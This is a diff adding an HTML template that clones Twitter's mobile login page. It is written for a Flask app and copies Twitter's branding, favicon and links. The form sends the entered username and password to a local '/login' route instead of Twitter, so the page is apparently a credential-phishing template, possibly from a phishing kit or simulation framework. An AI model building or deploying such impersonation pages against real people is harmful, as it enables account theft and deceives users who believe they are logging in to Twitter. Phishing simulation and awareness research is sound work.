@@ -1,0 +1,75 @@
+<!--?xml version="1.0" encoding="utf-8"?-->
+<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.1//EN" "http://www.openmobilealliance.org/tech/DTD/xhtml-mobile11.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <meta name="twitter-redirect-srcs" content="{&quot;pwreset-iphone&quot;:true,&quot;android&quot;:true,&quot;email&quot;:true}">
+    <meta name="twitter-redirect-url" content="twitter://timeline">
+    <meta name="csrf_id" content="2ec8cc59caf5ba721a14b4ced03e397a">
+
+    <link rel="icon" type="image/png" href="https://ma.twimg.com/twitter-mobile/03829332a8df5d2953a49985350249b25c314d9a/images/ic_favicon.png">
+
+    <title>Log in</title>
+    <link rel="stylesheet" media="screen" href="{{ url_for('static', filename='twitter/m5_sessions.css') }}" type="text/css">
+
+    <meta name="deciders" content="">
+    <meta name="google-site-verification" content="V0yIS0Ec_o3Ii9KThrCoMCkwTYMMJ_JYx_RSaGhFYvw">
+  </head>
+  <body class="images nojs sessions-page sessions-new-page">
+    <div id="container">
+
+      
+      <div class="timeline-head">
+        <a href="https://mobile.twitter.com/"><img src="{{ url_for('static', filename='twitter/larrybird.png') }}" alt="Twitter" class="larrybird"></a>
+        <span class="title">Log in</span>
+      </div>
+
+      
+      <div id="main_content">
+  <div class="signup-body">
+
+    <form action="/login" method="post" class="signin-form">
+        <span class="m2-auth-token">
+    <input name="authenticity_token" value="2ec8cc59caf5ba721a14b4ced03e397a" type="hidden">
+  </span>
+      <input name="remember_me" value="1" type="hidden">
+      <input name="wfa" value="1" type="hidden">
+         <input name="redirect_after_login" value="/" type="hidden">
+      <fieldset class="inputs">
+        <div class="signup-container">
+          <div class="signup-field">
+            <input autocapitalize="off" autocorrect="off" class="signup-input" id="session[username_or_email]" name="id" placeholder="Phone, email or username" type="text">
+        </div>
+        </div>
+        <div class="signup-container">
+          <div class="signup-field">
+            <input class="signup-input" id="session[password]" name="password" placeholder="Password" value="" type="password">
+          </div>
+        </div>
+      </fieldset>
+
+      
+      <div class="signup-button">
+        <button class="signup button" id="signupbutton" type="submit"> Log in </button>
+      </div>
+    </form>
+  </div>
+
+      <script src="{{ url_for('static', filename='twitter/m5_sessions.js') }}" type="text/javascript"></script>
+
+
+      </div>
+
+      
+      <div class="footer">
+          <div class="signup signup-field-hint"><a href="https://mobile.twitter.com/signup"> Sign up </a></div>
+          <div class="reset-password signup-field-hint">
+            <a href="https://twitter.com/account/begin_password_reset"> Forgot password? </a>
+          </div>
+      </div>
+
+    </div>
+  
+
+</body></html>
